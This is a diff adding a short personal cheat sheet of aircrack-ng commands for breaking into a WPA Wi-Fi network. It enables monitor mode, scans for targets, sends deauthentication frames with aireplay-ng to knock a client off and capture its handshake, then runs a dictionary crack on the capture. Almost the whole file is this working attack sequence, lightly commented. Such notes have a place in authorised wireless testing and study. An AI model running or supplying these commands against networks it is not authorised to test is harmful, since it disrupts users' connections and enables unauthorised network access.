@@ -1,0 +1,26 @@
+Wireless Interface: wlp2s0
+Dictionary path:
+BSSID:
+CHANNEL:
+STATION:
+
+#	monitor mode
+sudo airmon-ng start wlp2s0
+
+#	get BSSID and Channel (CH)
+sudo airodump-ng wlp2s0mon 
+
+#	get STATION and HANDSHAKE (after aireplay-ng)
+sudo airodump-ng -c (CH) --bssid (BSSID) -w (file_values) wlp2s0
+
+#	send multiple requests to create traffic in the station
+sudo aireplay-ng -0 9 -a BSSID -c STATION wlp2s0mon
+#	after this command files.cap are created and you can continue offline
+
+sudo aircrack-ng -b HANDSHAKE -w /dictionary/path.txt files-01.cap
+#	you can try with the other ones .cap
+
+#	disable monitor mode
+sudo airmon-ng stop wlp2s0mon
+
+
